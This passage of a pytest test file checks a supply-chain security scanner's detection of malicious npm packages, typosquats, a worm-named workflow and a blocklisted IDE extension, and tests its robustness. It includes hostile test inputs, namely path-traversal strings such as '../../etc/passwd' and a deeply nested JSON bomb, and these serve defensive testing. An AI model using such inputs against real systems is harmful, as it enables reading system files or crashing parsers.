    osv_env(monkeypatch, {"npm/@ctrl/tinycolor@4.1.1": ["MAL-2025-47141"], "npm/lodash@4.17.15": ["GHSA-aaaa-aaaa-aaaa"]}, docs)
    findings, checks = run_scan(make_ctx(tmp_path))
    assert len(findings) >= 4
    retired = {"T1562", "T1562.001", "T1562.002", "T1562.004", "T1562.006", "T1562.009", "T1070.001", "T1574.002", "T1656"}
    for f in findings:
        d = f.to_dict()
        json.dumps(d)
        assert f.rule_id.startswith("AEG-SC-") and f.title and f.description and f.location and f.recommendation
        assert f.mitre and not (set(f.mitre) & retired) and all(re.fullmatch(r"T\d{4}(\.\d{3})?", m) for m in f.mitre)
        assert f.category in ("malware", "suspicious", "vulnerability")
    for c in checks:
        json.dumps(c.to_dict())


def test_symlink_free_safe_join_blocks_traversal(tmp_path):
    assert sc._safe_join(tmp_path, "node_modules/a/node_modules/b") == tmp_path / "node_modules" / "a" / "node_modules" / "b"
    assert sc._safe_join(tmp_path, "../../etc/passwd") is None
    assert sc._safe_join(tmp_path, "node_modules/../../x") is None
    assert sc._safe_join(tmp_path, "C:\\Windows\\x") is None and sc._safe_join(tmp_path, "") is None


def test_malformed_lockfiles_do_not_break_the_scan(tmp_path):
    write(tmp_path, "bad/package-lock.json", "{{{ not json")
    write(tmp_path, "bad/yarn.lock", "\x00\x01\x02")
    write(tmp_path, "bad/Cargo.lock", "[[package]]\nname=\n")
    write(tmp_path, "bad/package.json", "[1,2,3]")
    findings, checks = run_scan(make_ctx(tmp_path, supplychain_online=False))
    assert findings == [] and not any(c.status == CheckStatus.ERROR for c in checks)


# =========================================================================== robustness
def test_hostile_deeply_nested_json_does_not_break_the_scan(tmp_path):
    deep = "[" * 200000 + "]" * 200000
    write(tmp_path, "evil/package-lock.json", deep)
    write(tmp_path, "evil/package.json", deep)
    write(tmp_path, "evil/.vscode/tasks.json", deep)
    write(tmp_path, "ok/requirements.txt", "requets==1.0\n")
    findings, checks = run_scan(make_ctx(tmp_path, supplychain_online=False))
    assert [f.rule_id for f in findings] == ["AEG-SC-TYPOSQUAT"]  # the healthy project is still analysed
    assert not any(c.status == CheckStatus.ERROR for c in checks)


def test_a_failing_check_loses_only_itself(tmp_path, monkeypatch):
    write(tmp_path, "r/.github/workflows/shai-hulud-workflow.yml", "on: push\n")
    write(tmp_path, "r/requirements.txt", "requets==1.0\n")

    def broken(path):
        raise RuntimeError("boom")

    monkeypatch.setattr(sc, "check_workflows", broken)
    findings, _ = run_scan(make_ctx(tmp_path, supplychain_online=False))
    assert [f.rule_id for f in findings] == ["AEG-SC-TYPOSQUAT"]


def test_unreadable_or_oversized_files_are_reported(tmp_path, monkeypatch):
    monkeypatch.setattr(lf, "MAX_MANIFEST_BYTES", 20)
    write(tmp_path, "p/package.json", json.dumps({"name": "x" * 50}))
    _, checks = run_scan(make_ctx(tmp_path, supplychain_online=False))
    c = next(c for c in checks if c.check_id == "AEG-SC-PROJECTS")
    assert c.status == CheckStatus.WARN and "could not be read or parsed" in c.detail


def test_cancelled_scan_returns_quickly_without_raising(tmp_path):
    write(tmp_path, "a/package.json", {"name": "a"})
    ctx = make_ctx(tmp_path, supplychain_online=False)
    ctx.cancel.set()
    out = list(sc.SupplyChainScanner().run(ctx))
    assert not any(isinstance(i, Finding) for i in out)


def test_osv_phase_stops_when_cancelled(tmp_path, monkeypatch):
    write(tmp_path, "svc/requirements.txt", "requests==2.19.0\n")
    fake = osv_env(monkeypatch, {"PyPI/requests@2.19.0": ["GHSA-aaaa-aaaa-aaaa"]},
                   {"GHSA-aaaa-aaaa-aaaa": ghsa("GHSA-aaaa-aaaa-aaaa", "HIGH", pkg=("PyPI", "requests"))})
    client = OsvClient(tmp_path / "osv.json")
    res = client.query([Pkg("PyPI", "requests", "2.19.0")], should_stop=lambda: True)
    assert res == {} and client.truncated and fake.batches == [] and client.unchecked == {Pkg("PyPI", "requests", "2.19.0")}
    client2 = OsvClient(tmp_path / "osv2.json")
    client2.query([Pkg("PyPI", "requests", "2.19.0")], deadline=0.0)  # a deadline in the past
    assert client2.truncated and fake.batches == []


def test_scan_through_the_real_engine_with_default_dirs(tmp_path, monkeypatch):
    """ScanEngine -> supplychain + ide on a fake home: default developer folders are discovered."""
    from aegis.core.engine import ScanEngine

    home = tmp_path / "home"
    write(home, "projects/demo/package.json", {"name": "demo", "dependencies": {"lodahs": "^1.0.0"}})
    ext = write(home, ".vscode/extensions/ahban.shiba-0.0.1/package.json", {"name": "shiba", "publisher": "ahban", "version": "0.0.1"})
    from aegis.scanners import ide

    monkeypatch.setattr(sc, "user_home", lambda: home)
    monkeypatch.setattr(ide, "user_home", lambda: home)
    res = ScanEngine().scan("custom", ["supplychain", "ide"], paths=[tmp_path / "nowhere"])
    rules = {f.rule_id for f in res.findings}
    assert {"AEG-SC-TYPOSQUAT", "AEG-IDE-BLOCKLIST"} <= rules and not res.errors
    assert any(f.location == str(ext.parent) for f in res.findings)
    assert {c.check_id for c in res.checks} >= {"AEG-SC-PROJECTS", "AEG-IDE-EXTENSIONS"}
